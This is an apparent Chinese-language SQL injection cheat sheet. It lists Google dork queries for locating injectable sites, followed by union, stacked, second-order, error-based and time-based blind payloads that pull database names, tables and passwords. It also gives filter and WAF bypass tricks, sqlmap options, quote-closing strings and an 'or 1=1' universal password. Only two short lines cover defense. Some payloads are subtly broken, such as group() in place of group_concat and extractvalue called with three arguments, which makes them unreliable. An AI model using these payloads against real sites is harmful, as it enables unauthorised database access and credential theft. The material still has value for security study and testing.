### 一、漏洞原理

#### 	1、简介

```python
# 解释
WEB应用程序对用户输入数据的合法性没有判断或过滤不严，导致攻击者可以插入恶意语句达成目的
```

```python
# 危害
1、数据库信息泄露
2、网页篡改
3、数据库被恶意操作
4、数据库被远程控制
5、删除和修改数据库表信息
```

#### 	2、详情

```python
# c
1、转义字符处理不当
2、类型处理不当
3、查询语句组装不当
4、错误处理不当
5、多个提交处理不当
6、数据库配置问题
```



### 三、漏洞特征

#### 	1、场景

```python
# 有回显
增删改
	- 注册
	- 删除
	- 修改
# 无回显
查
	- 查询
```

#### 	2、发现

```python
# 增
site:xxx.com inurl:login.php
```

```python
# 查
site:xxx.com inurl:php?id=
# 更多：https://github.com/xuanhun/HackingResource/blob/master/web%E5%AE%89%E5%85%A8/google%20hack%20%E4%B9%8Bsql%E6%B3%A8%E5%85%A5.md
```

#### 	3、提交方式

```
GET
POST
Cookie
UserAgent
Referer
```



### 三、利用条件

#### 1、传入参数可控	

#### 2、应用过滤不当



### 四、利用方法

#### 1、联合查询

```python
# 1、查询列数
order by 2 --+
# 2、确定显位
union select 1,2 --+
# 3、查询版本号
union select 1,version() --+
# 4、查询用户权限
union select 1,user() --+
# 5、查询库名
union select 1,database() --+
# 6、查询表名
union select 1,group(table_name) from information_schema.tables where table_schema=database() --+
# 7、查询列名
union select 1,group(column_name) from information_schema.columns where table_name='[表名]' --+
# 8、查询数据
union select 1,password from '[表名]' --+
```

#### 2、堆叠

```python
# 1、所有数据库
1';show databases;#
```

```python
# 2、所有数据表
1';show tables;#
```

#### 3、二次

```python
# 1、一次
admin'#
```

```python
# 2、二次
直接修改密码
```

#### 4、报错

```mysql
# updatexml() + concat()
# 1、查询库名
' and updatexml(1,concat(database()),1) #
# 2、查询表名
' and updatexml(1,concat(select table_name from information_schema.tables where table_schema=database),1) #
# 3、查询列名
' and updatexml(1,concat(select column_name from information_schema.columns where table_name='[表名]'),1) #
# 4、查询数据
' and updatexml(1,concat(select password from '[表名]'),1)
```

```mysql
# extractvalue() + concat()
# 1、查询库名
' and extractvalue(1,concat(database()),1) #
# 2、查询表名
' and extractvalue(1,concat(select table_name from information_schema.tables where table_schema=database),1) #
# 3、查询列名
' and extractvalue(1,concat(select column_name from information_schema.columns where table_name='[表名]'),1) #
# 4、查询数据
' and extractvalue(1,concat(select password from '[表名]'),1)
```

#### 6、时间盲注

```python
# sleep()
and sleep(5) --+
```

```python
# benchmark()
and benchmark(10000000,sha(1)); --+
```



### 五、绕过防护

#### 1、注释

```python
#
--+
/**/
;
```

#### 2、空格

```python
/**/
()
%0a（回车）
`
tap
双空格
```

#### 3、and or xor not

```python
and		&&
or		||
xor		| # 异或
not		!
```

#### 4、等号=

```
like		=
rlike		模糊匹配
regexp		正则匹配
>1 <3		大小于号判断
<>			!=
```

#### 5、引号

```
16进制
宽字节
```

```python
# 新姿势
username=\&password='or 1=1#
```

#### 7、关键字

```python
大小写
双写
16进制
ascii码
```



### 六、实战思路

#### 	1、练习

```
google hackin搜索注入方式相关的关键字
```

#### 	2、业务

```
1、确定数据库类型
2、确定网站所有功能点
3、确定数据提交方式
4、采取对应的注入方式
```



### 七、相关工具

#### 	1、SQLmap

```python
# 下载
https://github.com/sqlmapproject/sqlmap
```

```python
# 参数
-u				url
-r				txt
--data=		 	 post
--cookie=		 cookie
--user-agent=	 useragent
--referer=		 referer
--proxy=		 代理
--is-dba		 当前用户是否是DBA
--dbs			所有数据库
--current-db	 当前数据库名
-D				指定数据库
--tables		所有数据表名
-T				指定数据表
--columns		所有列名
-C				指定列
-dump			数据内容
```

```python
# 用法
python3 sqlmap.py -u [url]
```



### 八、防护措施

#### 1、黑白名单

#### 2、参数化查询



### 九、其他补充

#### 1、闭合语句

```
'
"
')
")
'))
"))
--+
#
%23
```

#### 2、万能密码

```
or 1=1
```
